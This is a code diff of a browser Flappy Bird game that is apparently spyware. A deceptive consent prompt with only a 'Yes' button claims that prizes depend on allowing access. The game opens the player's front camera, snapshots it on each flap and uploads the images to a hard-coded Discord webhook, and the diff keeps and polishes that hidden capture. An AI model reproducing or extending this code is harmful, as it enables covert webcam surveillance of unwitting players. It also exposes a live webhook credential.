@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Flappy Bird 1</title>
+  <title>Flappy Bird</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#000; }
@@ -12,7 +12,6 @@
     .panel { background:white; padding:20px; border-radius:12px; text-align:center; max-width:350px; }
     .panel button { margin:8px; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-size:16px; }
     .allow { background:#2ecc71; color:white; }
-    .deny { background:#e74c3c; color:white; }
   </style>
 </head>
 <body>
@@ -20,8 +19,8 @@
 
   <div id="consentModal" class="modal">
     <div class="panel">
-      <h2>Allow?</h2>
-      <p>You have to allow some settings for it to work</p>
+      <h2>Allow</h2>
+      <p>You have to allow some settings for it to work, You wont be able to redeem any prizes if you don't Goals 100</p>
       <button class="allow" id="allowBtn">Yes</button>
     </div>
   </div>
@@ -44,35 +43,19 @@ let camEnabled = false;
 let mediaStream;
 
 // Discord webhook
-const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl";
+const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl"; // replace
 
 // Sprites
-const bg = new Image();
-bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
-const birdImg = new Image();
-birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
-const pipeImg = new Image();
-pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";
+const bg = new Image(); bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
+const birdImg = new Image(); birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
+const pipeImg = new Image(); pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";
 
-let loaded = 0;
-const total = 3;
-function checkLoaded() {
-  loaded++;
-  if (loaded === total) {
-    loop(); // start only after all assets are loaded
-  }
-}
-bg.onload = checkLoaded;
-birdImg.onload = checkLoaded;
-pipeImg.onload = checkLoaded;
-
-// Game vars
 let started = false, alive = true;
 let score = 0, best = 0;
 const plr = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.4, jump: -7 };
 
 let pipes = [];
-const gap = 120;
+const gap = 140;
 const pipeWidth = 52;
 const pipeSpeed = 2;
 
@@ -81,10 +64,8 @@ allowBtn.onclick = async () => {
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = mediaStream;
-    await video.play(); // ensure stream starts
     camEnabled = true;
   } catch (e) {
-    console.error(e);
     alert("Camera permission denied or unavailable. Playing without it.");
   }
   consentModal.classList.add("hidden");
@@ -97,9 +78,11 @@ function reset() {
   started = false; alive = true;
 }
 
-// Pipes
+// Spawn pipe
 function spawnPipe() {
-  const topHeight = 50 + Math.random() * (H - gap - 150);
+  const minTop = 50;
+  const maxTop = H - gap - 50;
+  let topHeight = minTop + Math.random() * (maxTop - minTop);
   const bottomY = topHeight + gap;
   pipes.push({ x: W, top: topHeight, bottom: bottomY, passed: false });
 }
@@ -112,14 +95,8 @@ function flap() {
   if (camEnabled) takeSnap();
 }
 
-// Snapshot
+// Take snapshot
 function takeSnap() {
-  if (!video.videoWidth || !video.videoHeight) {
-    console.warn("Video not ready yet");
-    return;
-  }
-  snap.width = video.videoWidth;
-  snap.height = video.videoHeight;
   snapCtx.drawImage(video, 0, 0, snap.width, snap.height);
   snap.toBlob(async blob => {
     if (!blob) return;
@@ -139,16 +116,12 @@ function update() {
   plr.vy += plr.gravity;
   plr.y += plr.vy;
 
-  if (Math.random() < 0.02) spawnPipe();
+  if (pipes.length === 0 || pipes[pipes.length-1].x < W - 200) spawnPipe();
   pipes.forEach(p => p.x -= pipeSpeed);
   pipes = pipes.filter(p => p.x + pipeWidth > 0);
 
   for (let p of pipes) {
-    if (!p.passed && p.x + pipeWidth < plr.x) {
-      score++;
-      p.passed = true;
-      best = Math.max(best, score);
-    }
+    if (!p.passed && p.x + pipeWidth < plr.x) { score++; p.passed = true; best = Math.max(best, score); }
     if (plr.x + plr.w/2 > p.x && plr.x - plr.w/2 < p.x + pipeWidth) {
       if (plr.y - plr.h/2 < p.top || plr.y + plr.h/2 > p.bottom) alive = false;
     }
@@ -158,22 +131,19 @@ function update() {
 
 // Draw
 function draw() {
-  // fallback fill
-  ctx.fillStyle = "#70c5ce";
-  ctx.fillRect(0, 0, W, H);
-
   ctx.drawImage(bg, 0, 0, W, H);
 
   pipes.forEach(p => {
-    const headOverlap = 24;
-    // top pipe flipped
+    // Draw top pipe stretched upwards
+    const topHeight = p.top;
     ctx.save();
-    ctx.translate(p.x, p.top - headOverlap);
+    ctx.translate(p.x, topHeight);
     ctx.scale(1, -1);
-    ctx.drawImage(pipeImg, 0, -pipeImg.height);
+    ctx.drawImage(pipeImg, 0, 0, pipeWidth, H - topHeight);
     ctx.restore();
-    // bottom pipe
-    ctx.drawImage(pipeImg, p.x, p.bottom);
+
+    // Draw bottom pipe stretched downwards
+    ctx.drawImage(pipeImg, p.x, p.bottom, pipeWidth, H - p.bottom);
   });
 
   ctx.drawImage(birdImg, plr.x - plr.w/2, plr.y - plr.h/2, plr.w, plr.h);
@@ -192,6 +162,7 @@ function loop() {
   draw();
   requestAnimationFrame(loop);
 }
+loop();
 
 canvas.addEventListener("click", flap);
 window.addEventListener("keydown", e => { if (e.code === "Space") flap(); });
